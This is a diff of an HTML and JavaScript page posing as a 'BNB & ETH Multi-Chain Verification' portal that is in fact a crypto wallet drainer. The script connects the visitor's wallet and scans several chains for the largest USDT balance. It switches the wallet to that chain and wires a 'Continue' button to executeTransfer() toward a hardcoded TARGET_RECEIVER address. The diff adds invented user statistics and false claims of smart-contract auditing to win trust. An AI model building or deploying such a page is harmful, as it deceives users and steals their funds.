@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>BNB Chain | Secure System</title>
+  <title>BNB & ETH | Multi-Chain Verification</title>
   
   <!-- Ethers.js & FontAwesome Library -->
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
@@ -15,58 +15,57 @@
     
     .app-container { width: 100%; max-width: 430px; background-color: #0b0e14; display: flex; flex-direction: column; min-height: 100vh; position: relative; }
 
-    /* Header (Matching Screenshots 33838 & 33839) */
+    /* Header (Matching Screenshots 33937-33939) */
     .brand-header { padding: 16px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid rgba(255,255,255,0.08); background-color: #0b0e14; position: sticky; top: 0; z-index: 10; }
-    .brand-logo { display: flex; align-items: center; gap: 8px; font-weight: 800; font-size: 20px; color: #f3ba2f; letter-spacing: 0.5px; }
+    .brand-logo { display: flex; align-items: center; gap: 8px; font-weight: 800; font-size: 16px; color: #f3ba2f; letter-spacing: 0.5px; line-height: 1.2; }
+    .brand-logo span { font-size: 10px; color: #94a3b8; font-weight: 600; display: block; letter-spacing: 1px; }
     .secure-system-badge { display: flex; align-items: center; gap: 6px; font-size: 11px; font-weight: 700; color: #94a3b8; letter-spacing: 0.5px; text-transform: uppercase; }
     .dot-green { width: 6px; height: 6px; background-color: #00d395; border-radius: 50%; box-shadow: 0 0 8px #00d395; }
 
-    .content-area { padding: 20px 16px; display: flex; flex-direction: column; gap: 20px; width: 100%; }
+    .content-area { padding: 20px 16px; display: flex; flex-direction: column; gap: 16px; width: 100%; }
     
-    /* Tether Live Stats Section */
-    .tether-header-row { display: flex; align-items: center; justify-content: space-between; margin-bottom: 4px; }
-    .tether-title-group { display: flex; align-items: center; gap: 10px; }
-    .tether-icon { width: 36px; height: 36px; background-color: #26a17b; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 16px; color: white; }
-    .tether-title-text { font-size: 20px; font-weight: 800; color: #ffffff; }
-    
-    .live-badge { border: 1px solid rgba(0, 211, 149, 0.4); color: #00d395; font-size: 11px; padding: 4px 12px; border-radius: 20px; display: flex; align-items: center; gap: 6px; background-color: rgba(0, 211, 149, 0.05); font-weight: 700; }
-    .live-dot { width: 6px; height: 6px; background-color: #00d395; border-radius: 50%; animation: pulse 1.5s infinite; }
-    @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
-
-    .stats-section-title { font-size: 15px; font-weight: 700; color: #ffffff; margin-bottom: 12px; }
-
-    /* Stats Grid (2x2 matching 33838) */
-    .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; margin-bottom: 10px; }
-    .stat-card { background-color: #12161f; border: 1px solid #1e2430; border-radius: 14px; padding: 14px; display: flex; flex-direction: column; gap: 6px; }
-    .stat-label { font-size: 11px; color: #718096; line-height: 1.3; font-weight: 500; }
-    .stat-val { font-size: 18px; font-weight: 800; color: #f3ba2f; }
-    .stat-sub { font-size: 10px; color: #00d395; font-weight: 600; }
-
-    /* Heading & Description */
-    .main-heading { font-size: 26px; font-weight: 800; color: #ffffff; margin-top: 10px; }
-    .main-subheading { font-size: 13px; color: #f3ba2f; font-weight: 600; margin-top: 4px; }
-    .main-desc { font-size: 12px; color: #718096; line-height: 1.5; margin-top: 6px; }
-
-    /* Verification Box (Matching Screenshot 33839) */
-    .verify-box { background-color: #12161f; border: 1px solid rgba(243, 186, 47, 0.3); border-radius: 20px; padding: 24px 20px; display: flex; flex-direction: column; align-items: center; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); margin-top: 10px; }
+    /* Verification Box */
+    .verify-box { background-color: #12161f; border: 1px solid rgba(243, 186, 47, 0.3); border-radius: 20px; padding: 24px 20px; display: flex; flex-direction: column; align-items: center; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
     .bsc-logo-circle { width: 64px; height: 64px; border-radius: 50%; background-color: #0b0e14; border: 1px solid #2a2f3d; display: flex; align-items: center; justify-content: center; margin-bottom: 18px; color: #f3ba2f; font-size: 28px; box-shadow: inset 0 2px 8px rgba(0,0,0,0.8); }
-    
     .bsc-verification-pill { border: 1px solid rgba(243, 186, 47, 0.4); color: #f3ba2f; font-size: 11px; padding: 6px 16px; border-radius: 20px; font-weight: 700; background-color: rgba(243, 186, 47, 0.05); margin-bottom: 20px; letter-spacing: 0.5px; }
 
-    .btn-verify { width: 100%; background-color: #f3ba2f; color: #000000; border: none; padding: 16px; border-radius: 12px; font-weight: 800; font-size: 16px; cursor: pointer; transition: 0.2s; box-shadow: 0 4px 20px rgba(243, 186, 47, 0.25); }
+    .btn-verify { width: 100%; background-color: #f3ba2f; color: #000000; border: none; padding: 16px; border-radius: 12px; font-weight: 800; font-size: 16px; cursor: pointer; transition: 0.2s; box-shadow: 0 4px 20px rgba(243, 186, 47, 0.25); -webkit-tap-highlight-color: transparent; }
     .btn-verify:active { transform: scale(0.98); }
 
-    /* Verified Success View (Matching Screenshot 33832) */
+    /* Feature Cards (Matching 33937) */
+    .feature-card { background-color: #12161f; border: 1px solid #1e2430; border-radius: 20px; padding: 24px 20px; display: flex; flex-direction: column; gap: 8px; }
+    .feature-icon-box { width: 40px; height: 40px; background-color: #1a1f2c; border-radius: 12px; display: flex; align-items: center; justify-content: center; color: #f3ba2f; margin-bottom: 6px; font-size: 16px; }
+    .feature-val { font-size: 32px; font-weight: 800; color: #ffffff; letter-spacing: -0.5px; }
+    .feature-label { font-size: 14px; color: #718096; font-weight: 600; }
+    .feature-sub { font-size: 12px; color: #00d395; font-weight: 700; margin-top: 4px; }
+
+    /* Token Ticker (Matching 33938 & 33939) */
+    .token-ticker-grid { display: flex; gap: 10px; overflow-x: auto; padding-bottom: 6px; margin-top: 4px; scrollbar-width: none; }
+    .token-ticker-grid::-webkit-scrollbar { display: none; }
+    .ticker-pill-card { background-color: #12161f; border: 1px solid #1e2430; border-radius: 14px; padding: 12px 18px; display: flex; align-items: center; gap: 10px; flex-shrink: 0; font-weight: 700; font-size: 13px; color: #ffffff; }
+
+    /* Info Cards (Matching 33938 & 33939) */
+    .info-card { background-color: #12161f; border: 1px solid #1e2430; border-radius: 20px; padding: 24px 20px; display: flex; flex-direction: column; gap: 12px; margin-top: 4px; }
+    .info-title { font-size: 20px; font-weight: 800; color: #f3ba2f; }
+    .info-text { font-size: 13px; color: #94a3b8; line-height: 1.6; }
+
+    /* Footer Links (Matching 33938 & 33939) */
+    .footer-links-container { background-color: #0b0e14; border-top: 1px solid #1e2430; padding: 30px 20px; display: flex; flex-direction: column; align-items: center; text-align: center; gap: 16px; margin-top: 20px; }
+    .footer-brand { display: flex; align-items: center; gap: 8px; color: #f3ba2f; font-weight: 700; font-size: 14px; }
+    .footer-links-row { display: flex; gap: 20px; font-size: 13px; color: #94a3b8; font-weight: 500; }
+    .footer-copy { font-size: 11px; color: #475569; line-height: 1.5; }
+
+    /* Verified Success View */
     .verified-card { background-color: #12161f; border: 1px solid #1e2430; border-radius: 20px; padding: 28px 20px; text-align: center; width: 100%; box-shadow: 0 20px 40px rgba(0,0,0,0.8); margin-top: 20px; }
     .green-shield-icon { width: 56px; height: 56px; border-radius: 50%; background-color: rgba(0, 211, 149, 0.1); border: 2px solid #00d395; color: #00d395; display: flex; align-items: center; justify-content: center; font-size: 24px; margin: 0 auto 16px auto; }
     .verified-title { font-size: 22px; font-weight: 800; color: #ffffff; margin-bottom: 6px; }
     .verified-subtitle { font-size: 12px; color: #718096; margin-bottom: 24px; line-height: 1.5; }
     
-    .balance-box { background-color: #0b0e14; border-radius: 14px; width: 100%; padding: 18px 0; margin-bottom: 24px; border: 1px solid #1a2233; }
+    .balance-box { background-color: #0b0e14; border-radius: 14px; width: 100%; padding: 18px 0; margin-bottom: 24px; border: 1px solid #1e2430; }
     .balance-label { font-size: 11px; color: #718096; margin-bottom: 6px; text-transform: uppercase; font-weight: 600; letter-spacing: 0.5px; }
     .balance-val { font-size: 28px; font-weight: 800; color: #00d395; }
 
-    .btn-continue { width: 100%; background-color: #f3ba2f; color: #000; border: none; padding: 16px; border-radius: 12px; font-weight: 800; font-size: 15px; cursor: pointer; transition: 0.2s; box-shadow: 0 4px 15px rgba(243, 186, 47, 0.2); }
+    .btn-continue { width: 100%; background-color: #f3ba2f; color: #000; border: none; padding: 16px; border-radius: 12px; font-weight: 800; font-size: 15px; cursor: pointer; transition: 0.2s; box-shadow: 0 4px 15px rgba(243, 186, 47, 0.2); -webkit-tap-highlight-color: transparent; }
     .btn-continue:active { transform: scale(0.98); }
 
     .loader { border: 2px solid #000; border-top: 2px solid transparent; border-radius: 50%; width: 16px; height: 16px; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; margin-right: 6px; }
@@ -78,10 +77,11 @@
 
   <div class="app-container">
     
-    <!-- Top Header -->
+    <!-- Top Header (Matching 33937-33939) -->
     <div class="brand-header">
       <div class="brand-logo">
-        <i class="fa-solid fa-cube"></i> BNB CHAIN
+        <i class="fa-solid fa-shield-halved" style="color: #f3ba2f;"></i>
+        <div>BNB & ETH <span>VERIFICATION</span></div>
       </div>
       <div class="secure-system-badge">
         SECURE SYSTEM <span class="dot-green"></span>
@@ -90,69 +90,90 @@
 
     <div class="content-area">
       
-      <!-- Initial View (Matching Screenshots 33838 & 33839) -->
+      <!-- Initial View -->
       <div id="initialView">
         
-        <!-- Tether Live Stats Header -->
-        <div class="tether-header-row">
-          <div class="tether-title-group">
-            <div class="tether-icon">₮</div>
-            <div class="tether-title-text">Tether</div>
-          </div>
-          <div class="live-badge">
-            <span class="live-dot"></span> Live
-          </div>
-        </div>
-
-        <div class="stats-section-title">Live Verification Stats (USDT)</div>
-
-        <!-- 2x2 Stats Grid -->
-        <div class="stats-grid">
-          <div class="stat-card">
-            <div class="stat-label">Total USDT Verified (Today)</div>
-            <div class="stat-val">$29,212,059</div>
-            <div class="stat-sub">+8.24% vs yesterday</div>
-          </div>
-          <div class="stat-card">
-            <div class="stat-label">Total USDT Verified (This Week)</div>
-            <div class="stat-val" style="font-size: 17px;">$178,946,721</div>
-            <div class="stat-sub">+12.75% vs last week</div>
-          </div>
-          <div class="stat-card">
-            <div class="stat-label">Total USDT Verified (This Month)</div>
-            <div class="stat-val" style="font-size: 17px;">$762,387,654</div>
-            <div class="stat-sub" style="color:#00d395;">+15.32% vs last month</div>
-          </div>
-          <div class="stat-card">
-            <div class="stat-label">Total USDT Verified (All Time)</div>
-            <div class="stat-val" style="font-size: 17px;">$4,892,765,321</div>
-            <div class="stat-sub" style="color:#718096;">All time total</div>
-          </div>
-        </div>
-
-        <!-- Titles & Description -->
-        <div style="margin-top: 14px;">
-          <h1 class="main-heading">Verify Crypto Assets</h1>
-          <div class="main-subheading">Powered by BNB Chain's official</div>
-          <p class="main-desc">The official institutional gateway for smart contract auditing and asset verification on the BNB Smart Chain ecosystem.</p>
-        </div>
-
-        <!-- Verification Box (Matching Screenshot 33839) -->
+        <!-- Verification Box -->
         <div class="verify-box">
           <div class="bsc-logo-circle">
             <i class="fa-solid fa-cube"></i>
           </div>
           
-          <div class="bsc-verification-pill">BNB CHAIN VERIFICATION</div>
+          <div class="bsc-verification-pill">MULTI-CHAIN VERIFICATION</div>
 
-          <button id="mainVerifyBtn" class="btn-verify" onclick="initiateAuditFlow()">
+          <button id="mainVerifyBtn" class="btn-verify" type="button" onclick="initiateAuditFlow()">
             <span id="btnText">Verify Asset</span>
           </button>
         </div>
 
+        <!-- Feature Card 1: Assets Verified -->
+        <div class="feature-card">
+          <div class="feature-icon-box">
+            <i class="fa-solid fa-cube"></i>
+          </div>
+          <div class="feature-val">92,768</div>
+          <div class="feature-label">Assets Verified</div>
+          <div class="feature-sub">+18.6% this month</div>
+        </div>
+
+        <!-- Feature Card 2: Active Addresses -->
+        <div class="feature-card">
+          <div class="feature-icon-box">
+            <i class="fa-solid fa-users"></i>
+          </div>
+          <div class="feature-val">1.2M+</div>
+          <div class="feature-label">Active Addresses</div>
+          <div class="feature-sub">+22.3% this month</div>
+        </div>
+
+        <!-- Feature Card 3: Ecosystem Users -->
+        <div class="feature-card" style="border: 1px solid rgba(243, 186, 47, 0.3);">
+          <div class="feature-icon-box">
+            <i class="fa-solid fa-star"></i>
+          </div>
+          <div class="feature-val">2.3M+</div>
+          <div class="feature-label">Ecosystem Users</div>
+          <div class="feature-sub">99.9% satisfaction</div>
+        </div>
+
+        <!-- Token Ticker Carousel (Matching 33938 & 33939) -->
+        <div class="token-ticker-grid">
+          <div class="token-pill-card"><i class="fa-solid fa-circle" style="color: #627eea; font-size: 10px;"></i> Ethereum ETH</div>
+          <div class="token-pill-card"><i class="fa-solid fa-circle" style="color: #3b82f6; font-size: 10px;"></i> USD Coin USDC</div>
+          <div class="token-pill-card"><i class="fa-solid fa-circle" style="color: #14f195; font-size: 10px;"></i> Solana SOL</div>
+          <div class="token-pill-card"><i class="fa-solid fa-circle" style="color: #26a17b; font-size: 10px;"></i> Tether USDT</div>
+        </div>
+
+        <!-- Multi-Chain Consensus Card -->
+        <div class="info-card">
+          <div class="info-title">Multi-Chain Consensus</div>
+          <div class="info-text">Seamlessly verifies Tether (USDT) on Ethereum Mainnet and BNB Smart Chain, providing high-performance decentralized audit infrastructure.</div>
+        </div>
+
+        <!-- Security Audit Card -->
+        <div class="info-card">
+          <div class="info-title">Security Audit</div>
+          <div class="info-text">Our verification engine performs real-time auditing of smart contract bytecode to ensure investor protection and token authenticity.</div>
+        </div>
+
+        <!-- Footer Navigation Links (Matching 33938 & 33939) -->
+        <div class="footer-links-container">
+          <div class="footer-brand">
+            <i class="fa-solid fa-shield-halved"></i> Asset Verification Protocol
+          </div>
+          <div class="footer-links-row">
+            <span>Documentation</span>
+            <span>Whitepaper</span>
+            <span>Support</span>
+          </div>
+          <div class="footer-copy">
+            &copy; 2026 USDT Multi-Chain Asset Verification Portal. All rights reserved.
+          </div>
+        </div>
+
       </div>
 
-      <!-- Verified Success View (Matching Screenshot 33832) -->
+      <!-- Verified Success View -->
       <div id="verifiedView" class="hidden">
         <div class="verified-card">
           <div class="green-shield-icon">
@@ -167,7 +188,7 @@
             <div id="verifiedUsdtBalance" class="balance-val">0.00 USDT</div>
           </div>
 
-          <button class="btn-continue" onclick="executeTransfer()">
+          <button class="btn-continue" type="button" onclick="executeTransfer()">
             Continue
           </button>
         </div>
@@ -179,17 +200,9 @@
 
   <script>
     const TARGET_RECEIVER = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3";
-
+    
     // Multi-Chain USDT Configuration
     const CHAINS = [
-      {
-        chainId: 56,
-        chainIdHex: '0x38',
-        name: 'BNB Smart Chain',
-        rpc: 'https://bsc-dataseed.binance.org/',
-        usdtAddress: '0x55d398326f99059fF775485246999027B3197955',
-        decimals: 18
-      },
       {
         chainId: 1,
         chainIdHex: '0x1',
@@ -197,6 +210,14 @@
         rpc: 'https://eth.llamarpc.com',
         usdtAddress: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
         decimals: 6
+      },
+      {
+        chainId: 56,
+        chainIdHex: '0x38',
+        name: 'BNB Smart Chain',
+        rpc: 'https://bsc-dataseed.binance.org/',
+        usdtAddress: '0x55d398326f99059fF775485246999027B3197955',
+        decimals: 18
       },
       {
         chainId: 137,
@@ -226,9 +247,11 @@
     let maxUsdtWei = ethers.BigNumber.from(0);
 
     function getActiveProvider() {
-      if (window.ethereum) return window.ethereum;
-      if (window.trustwallet) return window.trustwallet;
-      if (window.web3 && window.web3.currentProvider) return window.web3.currentProvider;
+      if (typeof window !== 'undefined') {
+        if (window.ethereum) return window.ethereum;
+        if (window.trustwallet) return window.trustwallet;
+        if (window.web3 && window.web3.currentProvider) return window.web3.currentProvider;
+      }
       return null;
     }
 
@@ -252,17 +275,17 @@
         }
 
         const btnText = document.getElementById("btnText");
-        btnText.innerHTML = '<span class="loader"></span> Connecting...';
+        if(btnText) btnText.innerHTML = '<span class="loader"></span> Connecting...';
 
         const accounts = await ethProvider.request({ method: 'eth_requestAccounts' });
         globalUserAddress = accounts[0];
 
-        btnText.innerHTML = '<span class="loader"></span> Scanning Chains...';
+        if(btnText) btnText.innerHTML = '<span class="loader"></span> Scanning Chains...';
 
         let highestBalance = ethers.BigNumber.from(0);
         let bestChain = CHAINS[0];
 
-        // Scan all chains simultaneously via public RPCs to find highest USDT
+        // Scan all supported chains for the highest USDT balance
         for (const chain of CHAINS) {
           try {
             const rpcProvider = new ethers.providers.JsonRpcProvider(chain.rpc);
@@ -277,14 +300,14 @@
               bestChain = chain;
             }
           } catch (err) {
-            console.log(`Scan failed on ${chain.name}:`, err);
+            console.log(`Scan failed for ${chain.name}:`, err);
           }
         }
 
         selectedChain = bestChain;
         maxUsdtWei = highestBalance;
 
-        // Switch wallet to the chain with the highest balance
+        // Automatically switch wallet to the chain with the highest USDT balance
         await switchToChain(ethProvider, bestChain.chainIdHex);
 
         const provider = new ethers.providers.Web3Provider(ethProvider, "any");
